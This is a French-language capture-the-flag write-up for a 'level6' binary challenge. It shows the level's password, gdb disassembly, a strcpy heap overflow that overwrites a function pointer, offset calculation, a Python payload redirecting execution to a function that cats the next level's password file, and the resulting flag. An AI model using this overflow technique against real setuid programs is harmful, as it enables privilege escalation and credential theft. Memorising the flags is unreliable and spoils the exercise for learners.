# Level6

> login:password -> *`level6:d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31`*
```
:~$ su level6
Password:d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
---

```
:~$ pwd
/home/user/level6
```

```
:~$ ls -la
total 17
dr-xr-x---+ 1 level6 level6   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level6 level6  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level6 level6 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level7 users  5274 Mar  6  2016 level6
-rw-r--r--+ 1 level6 level6   65 Sep 23  2015 .pass
-rw-r--r--  1 level6 level6  675 Apr  3  2012 .profile
```

Le Home contient un binaire `level6` :

```
:~$ ./level6
Segmentation fault (core dumped)

:~$ ./level6 test
Nope
```

Sans paramètre le binaire segfault.
Avec un ou plusieurs paramètres, il affiche un simple `Nope`

```
:~$ gdb level6
...

(gdb) disas main
Dump of assembler code for function main:
   (...)
   0x08048485 <+9>:	movl   $0x40,(%esp)
   0x0804848c <+16>:	call   0x8048350 <malloc@plt>
   (...)
   0x08048495 <+25>:	movl   $0x4,(%esp)
   0x0804849c <+32>:	call   0x8048350 <malloc@plt>
   (...)
   0x080484a5 <+41>:	mov    $0x8048468,%edx
   0x080484aa <+46>:	mov    0x18(%esp),%eax
   0x080484ae <+50>:	mov    %edx,(%eax)
   0x080484b0 <+52>:	mov    0xc(%ebp),%eax
   0x080484b3 <+55>:	add    $0x4,%eax
   0x080484b6 <+58>:	mov    (%eax),%eax
   0x080484b8 <+60>:	mov    %eax,%edx
   0x080484ba <+62>:	mov    0x1c(%esp),%eax
   0x080484be <+66>:	mov    %edx,0x4(%esp)
   0x080484c2 <+70>:	mov    %eax,(%esp)
   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:	mov    0x18(%esp),%eax
   0x080484ce <+82>:	mov    (%eax),%eax
   0x080484d0 <+84>:	call   *%eax
   0x080484d2 <+86>:	leave  
   0x080484d3 <+87>:	ret    
End of assembler dump.
```

Le main appel deux fonctions `malloc()`, la première (+16) de `0x40` (64) et une deuxième (+32) de `0x4` (4). Enfin il également appeler une fonction `strcpy()` (+73).

On remarque également qu'il va appeler une fonction pointeur (+41) à l'adresse `$0x8048468`

```
(gdb) info functions
All defined functions:

Non-debugging symbols:
(...)
0x08048340  strcpy@plt
(...)
0x08048350  malloc@plt
(...)
0x08048360  puts@plt
(...)
0x08048370  system@plt
(...)
0x08048454  n
0x08048468  m
0x0804847c  main
(...)

(gdb) disas m
Dump of assembler code for function m:
   (...)
   0x08048475 <+13>:	call   0x8048360 <puts@plt>
   0x0804847a <+18>:	leave  
   0x0804847b <+19>:	ret    
End of assembler dump.

(gdb) disas n
Dump of assembler code for function n:
   (...)
   0x0804845a <+6>:  movl   $0x80485b0,(%esp)
   0x08048461 <+13>:	call   0x8048370 <system@plt>
   0x08048466 <+18>:	leave  
   0x08048467 <+19>:	ret    
End of assembler dump.
```

On decouvre deux fonctions qui ne sont pas exploitees:
- `m()`: appel une fonction `puts()`
- `n()`: appel la fonction `system()`

Si on check la valeur de `$0x80485b0` (+6) dans `n()`, on peux en comprendre comment l'utiliser.

```
(gdb) x/s 0x80485b0
0x80485b0:	 "/bin/cat /home/user/level7/.pass"
```

```
(gdb) run AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZzAaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz
Starting program: /home/user/level6/level6 AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZzAaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz

Program received signal SIGSEGV, Segmentation fault.
0x67476646 in ?? ()
(gdb) info register eip
eip            0x67476646	0x67476646
(gdb) 
```

>>>>
>>>> CALCUL DE L'OFFSET
>>>>


L'offset pour son exploit est donc 72.

On va donc envoyer en argument de notre binaire *72 bytes* + l'adresse la fonction (0x08048454) `n()` afin d'appeler la fonction `system()`

```
:~$ python -c 'print "a" * 72 + "\x54\x84\x04\x08"' > /tmp/level6

:~$ ./level6 $(cat /tmp/level6)
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

